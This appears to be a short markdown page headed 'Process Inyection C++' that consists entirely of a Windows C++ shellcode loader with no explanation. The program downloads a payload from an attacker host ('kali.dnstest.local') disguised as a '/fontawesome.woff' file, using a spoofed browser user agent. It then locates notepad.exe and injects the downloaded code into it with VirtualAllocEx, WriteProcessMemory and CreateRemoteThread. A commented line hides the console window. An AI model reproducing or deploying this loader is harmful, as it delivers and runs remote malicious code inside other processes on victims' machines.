# Process Inyection C++





```cpp
#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <stdio.h>

#pragma comment (lib, "Wininet.lib")


struct Shellcode {
    BYTE* pcData;
    DWORD dwSize;
};


DWORD GetTargetPID();
BOOL Download(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode);
BOOL Inject(DWORD dwPID, Shellcode shellcode);


int main() {
    //::ShowWindow(::GetConsoleWindow(), SW_HIDE); // hide console window

    DWORD pid = GetTargetPID();
    if (pid == 0) { return 1; }

    struct Shellcode shellcode;
    if (!Download(L"kali.dnstest.local", 80, &shellcode)) { return 2; }

    //printf("Injecting %ld bytes into PID %ld\n", shellcode.dwSize, pid);
    if (!Inject(pid, shellcode)) { return 3; }

    return 0;
}

// ------ Getting the shellcode ------ //

BOOL Download(LPCWSTR host, INTERNET_PORT port, Shellcode* shellcode) {
    HINTERNET session = InternetOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0);

    HINTERNET connection = InternetConnect(
        session,
        host,
        port,
        L"",
        L"",
        INTERNET_SERVICE_HTTP,
        0,
        0);

    HINTERNET request = HttpOpenRequest(
        connection,
        L"GET",
        L"/fontawesome.woff",
        NULL,
        NULL,
        NULL,
        0,
        0);

    WORD counter = 0;
    while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
        counter++;
        Sleep(3000);
        if (counter >= 3) {
            return 0; // HTTP requests eventually failed
        }
    }

    DWORD bufSize = BUFSIZ;
    BYTE* buffer = new BYTE[bufSize];

    DWORD capacity = bufSize;
    BYTE* payload = (BYTE*)malloc(capacity);

    DWORD payloadSize = 0;

    while (true) {
        DWORD bytesRead;

        if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
            return 0;
        }

        if (bytesRead == 0) break;

        if (payloadSize + bytesRead > capacity) {
            capacity *= 2;
            BYTE* newPayload = (BYTE*)realloc(payload, capacity);
            payload = newPayload;
        }

        for (DWORD i = 0; i < bytesRead; i++) {
            payload[payloadSize++] = buffer[i];
        }

    }
    BYTE* newPayload = (BYTE*)realloc(payload, payloadSize);

    InternetCloseHandle(request);
    InternetCloseHandle(connection);
    InternetCloseHandle(session);

    (*shellcode).pcData = payload;
    (*shellcode).dwSize = payloadSize;
    return 1;
}

// ------ Finding a target process ------ //

DWORD GetFirstPIDProclist(const WCHAR** aszProclist, DWORD dwSize);
DWORD GetFirstPIDProcname(const WCHAR* szProcname);

DWORD GetTargetPID() {
    const WCHAR* aszProclist[2] = {
        L"notepad.exe",
        //L"msedge.exe"
    };
    return GetFirstPIDProclist(aszProclist, sizeof(aszProclist) / sizeof(aszProclist[0]));
}

DWORD GetFirstPIDProclist(const WCHAR** aszProclist, DWORD dwSize) {
    DWORD pid = 0;
    for (int i = 0; i < dwSize; i++) {
        pid = GetFirstPIDProcname(aszProclist[i]);
        if (pid > 0) {
            return pid;
        }
    }

    return 0;
}

DWORD GetFirstPIDProcname(const WCHAR* szProcname) {
    HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcessSnapshot) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnapshot, &pe32)) {
        CloseHandle(hProcessSnapshot);
        return 0;
    }

    DWORD pid = 0;
    while (Process32Next(hProcessSnapshot, &pe32)) {
        if (lstrcmpiW(szProcname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            //printf("Process found: %d %ls\n", pid, pe32.szExeFile);
            break;
        }
    }

    CloseHandle(hProcessSnapshot);
    return pid;
}

// ------ Injecting into process ------ //

BOOL Inject(DWORD dwPID, Shellcode shellcode) {
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, dwPID);
    if (!hProcess) { return 0; };

    LPVOID pRemoteAddr = VirtualAllocEx(hProcess, NULL, shellcode.dwSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READ);
    if (!pRemoteAddr) {
        CloseHandle(hProcess);
        return 0;
    };

    if (!WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, NULL)) {
        CloseHandle(hProcess);
        return 0;
    };

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
    if (hThread != NULL) {
        WaitForSingleObject(hThread, 500);

        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    CloseHandle(hProcess);
    return 0;
}
```

